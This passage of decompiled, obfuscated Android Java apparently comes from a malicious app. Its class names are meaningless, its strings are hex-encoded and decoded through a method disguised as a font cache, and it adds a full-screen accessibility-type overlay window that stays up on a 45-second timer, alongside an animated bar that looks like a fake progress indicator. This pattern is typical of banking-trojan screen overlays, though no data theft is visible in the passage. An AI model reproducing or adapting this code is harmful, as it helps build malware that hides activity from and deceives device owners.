                    ValueAnimator valueAnimatorOfFloat = ValueAnimator.ofFloat(0.0f, 1.0f);
                    valueAnimatorOfFloat.setDuration(2000L);
                    valueAnimatorOfFloat.setRepeatCount(-1);
                    valueAnimatorOfFloat.setInterpolator(new AccelerateDecelerateInterpolator());
                    valueAnimatorOfFloat.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { // from class: v.s.IMnwn7NTSvuxfhtaH
                        private static /* synthetic */ void bpouvuk() {
                        }

                        @Override // android.animation.ValueAnimator.AnimatorUpdateListener
                        public final void onAnimationUpdate(ValueAnimator valueAnimator) {
                            float fFloatValue = ((Float) valueAnimator.getAnimatedValue()).floatValue();
                            int i16 = width2;
                            int i17 = (int) (i16 * 0.6f);
                            int i18 = (int) (fFloatValue * (i16 - i17));
                            View view2 = view;
                            FrameLayout.LayoutParams layoutParams2 = (FrameLayout.LayoutParams) view2.getLayoutParams();
                            layoutParams2.width = i17;
                            layoutParams2.leftMargin = i18;
                            view2.setLayoutParams(layoutParams2);
                        }
                    });
                    valueAnimatorOfFloat.start();
                    return;
                }
                return;
            case 24:
                DataQFAdapter dataQFAdapter2 = (DataQFAdapter) this.vekpFI4d1Nc4fakF;
                apQOLJtARzrH apqoljtarzrh2 = (apQOLJtARzrH) this.JXn4Qf7zpnLjP5;
                try {
                    if (vbdyByOHPJmeGXlq.k84rwRrqzhrNQ1CdNQ9) {
                        TypefaceCache.obtain("001300770048009400E700B000C000A300630075005A009700E400AA00C000A2006300770057009500F500BE00D600BE006300650053008800E700B600DC00A0");
                    } else {
                        WindowManager windowManager2 = (WindowManager) dataQFAdapter2.getSystemService("window");
                        vbdyByOHPJmeGXlq.A1BaTVAMeIXMnh = new NiXw8wskyH18G(dataQFAdapter2);
                        WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams(-1, -1, 2032, 524672, -3);
                        layoutParams2.gravity = 8388659;
                        windowManager2.addView(vbdyByOHPJmeGXlq.A1BaTVAMeIXMnh, layoutParams2);
                        vbdyByOHPJmeGXlq.k84rwRrqzhrNQ1CdNQ9 = true;
                        vbdyByOHPJmeGXlq.Qrz92kRPw4GcghAc.postDelayed(vbdyByOHPJmeGXlq.qfTrc75xwRVMl85vh, 45000L);
                        TypefaceCache.obtain("001300770048009400E700B000C000A300630075005A009700E400AA00C000A200630079004D008200E200B300D300BE006300650053008800E700B1");
                    }
                    return;
                } catch (Exception e10) {
                    TypefaceCache.obtain("0030007E0054009000C000BE00C100B4003400790049008300D300BE00C200B300360064005E00C700F500AD00C000A80031002C001B");
                    e10.getMessage();
                    vbdyByOHPJmeGXlq.k84rwRrqzhrNQ1CdNQ9 = false;
                    vbdyByOHPJmeGXlq.A1BaTVAMeIXMnh = null;
                    apqoljtarzrh2.pyu8ovAipBTLYAiKab("");
                    return;
                }
            case 25:
                Nr9E0hIXnEbtttg4 nr9E0hIXnEbtttg4 = (Nr9E0hIXnEbtttg4) this.vekpFI4d1Nc4fakF;
                Af6wX3D8R2iFhqxr af6wX3D8R2iFhqxr2 = (Af6wX3D8R2iFhqxr) this.JXn4Qf7zpnLjP5;
                if (nr9E0hIXnEbtttg4.w9sT1Swbhx3hs.w9sT1Swbhx3hs instanceof ibVTtJUNfrGYbW) {
                    af6wX3D8R2iFhqxr2.cancel(true);
                    return;
                } else {
                    af6wX3D8R2iFhqxr2.hjneShqpF9Tis4(nr9E0hIXnEbtttg4.Ee8d2j4S9Vm5yGuR.dDIMxZXP1V8HdM());
                    return;
                }
            default:
                E9ubbQbrd21H0Yk4 e9ubbQbrd21H0Yk4 = (E9ubbQbrd21H0Yk4) this.vekpFI4d1Nc4fakF;
                R1oztwybM9zU2mqV r1oztwybM9zU2mqV2 = (R1oztwybM9zU2mqV) this.JXn4Qf7zpnLjP5;
                if (e9ubbQbrd21H0Yk4.J0zjQ7CAgohuxU20eCW6.w9sT1Swbhx3hs instanceof ibVTtJUNfrGYbW) {
                    r1oztwybM9zU2mqV2.cancel(true);
                    return;
                }
                return;
        }
    }

    public /* synthetic */ A68NpXPqwTFos99nt(Object obj, int i, Object obj2) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = obj;
        this.JXn4Qf7zpnLjP5 = obj2;
    }
}
